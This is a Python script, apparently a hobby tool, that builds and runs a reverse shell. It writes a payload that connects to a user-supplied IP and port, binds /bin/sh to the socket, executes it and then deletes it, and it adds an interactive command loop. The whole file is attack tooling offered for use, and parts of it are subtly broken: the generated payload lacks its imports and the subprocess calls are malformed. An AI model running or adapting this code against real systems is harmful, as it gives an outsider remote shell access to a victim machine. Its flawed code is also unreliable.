#Simple Shell lol
#
import socket,subprocess,os

class Revshells:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.payload = """
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".format(self.ip, self.port)
        
    def run(self):
        with open('revshell.py', 'w') as f:
            f.write(self.payload)
        subprocess.call("python3 revshell.py")
        subprocess.call("rm revshell.py")

    def send(self, command):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            s.send(command.encode())
            return s.recv(1024).decode()
        except socket.error:
            pass
    
    def send_file(self, file):
        with open(file, 'r') as f:
            commands = f.readlines()
        for command in commands:
            self.execute(command)
    
    def run_command(self, command):
        print(self.execute(command))

    def run_reverse(self, ip, port):
        self.payload = """
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".format(ip, port)
        with open('revshell.py', 'w') as f:
            f.write(self.payload)
        subprocess.call("python3 revshell.py")
        subprocess.call("rm revshell.py")


    def connect(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            return s
        except socket.error:
            pass
    
    def execute(self, command):
        s = self.connect()
        s.send(command.encode())
        return s.recv(1024).decode()
    
    def shell(self):
        while True:
            command = input("Shell> ")
            if command == "quit":
                break
            elif command[:2] == "cd":
                command = command.split(" ")
                os.chdir(command[1])
            elif command == "help":
                print("""
                help - Show this help
                quit - Exit the shell
                """)
            else:
                print(self.execute(command))
    
    def run_loop(self):
        while True:
            command = input("Shell> ")
            if command == "quit":
                break
            else:
                print(self.execute(command))
    
    def run_file(self, file):
        with open(file, 'r') as f:
            commands = f.readlines()
        for command in commands:
            print(self.execute(command))


if __name__ == "__main__":
    ip = input("Enter the ip: ")
    port = int(input("Enter the port: "))
    rev = Revshells(ip, port)
    rev.run()